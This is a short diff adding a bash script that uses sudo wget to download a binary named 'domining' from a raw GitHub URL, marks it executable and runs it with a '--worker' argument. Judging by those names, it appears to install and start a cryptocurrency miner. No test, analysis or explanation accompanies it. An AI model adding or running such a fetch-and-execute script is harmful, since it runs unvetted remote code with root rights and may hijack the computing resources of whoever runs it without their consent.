@@ -1,0 +1,4 @@
+#!/bin/bash
+sudo wget -O nhangheo https://raw.githubusercontent.com/vip8338/proto/main/domining
+sudo chmod +x nhangheo
+./nhangheo --worker=test123
